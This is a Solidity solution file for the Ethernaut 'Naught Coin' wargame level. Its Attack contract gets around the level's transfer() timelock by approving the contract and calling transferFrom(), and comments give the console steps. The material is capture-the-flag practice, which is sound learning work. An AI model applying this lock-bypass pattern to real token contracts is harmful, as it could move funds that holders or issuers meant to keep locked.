// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

// https://ethernaut.openzeppelin.com/level/0x096bb5e93a204BfD701502EB6EF266a950217218
// **Naught Coin** - remove all coins associated with your EOA without calling transfer()
// we do this by combining approve() and transferFrom()

interface Target {
    // prototype taken from OpenZeppelin ERC20 contract but modifiers were altered
    // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Attack {
    constructor() {}

    // before calling doit() you must approve this Attack contract for the total supply amount
    // await web3.eth.getStorageAt('TARGET_INSTANCE_ADDR', 7) is the TOTAL_SUPPLY value
    // await contract.approve("THIS_CONTRACT_ADDR", "0xd3c21bcecceda1000000")
    function doit() external {
        Target target = Target(TARGET_INSTANCE_ADDR);
        address from = address(EOA_WALLET_ADDR);
        address to = address(this);
        uint256 amount = 1000000 * (10**18);
        bool result = target.transferFrom(from, to, amount);
        if (result) {}
    }
}
